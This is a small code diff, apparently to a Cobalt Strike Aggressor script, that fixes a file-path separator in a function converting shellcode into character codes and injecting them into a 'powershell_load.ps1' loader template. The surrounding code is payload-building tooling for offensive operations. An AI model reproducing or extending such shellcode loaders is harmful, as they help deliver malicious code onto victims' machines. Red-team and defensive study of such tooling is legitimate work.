@@ -20,7 +20,7 @@ sub payload_bin_to_ps1 {
 		$char_code = $char_code.$shellcode;
 	}
 	$char_code = left($char_code, int(strlen($char_code)) - 1);
-	$org_file = $path.'powershell_load.ps1';
+	$org_file = $path.'\\powershell_load.ps1';
 	$handle = openf($org_file);
 	while $text (readln($handle)){ 
 		$rep = replace($text, 'acode.*=.*', 'acode='.$char_code)."\n";
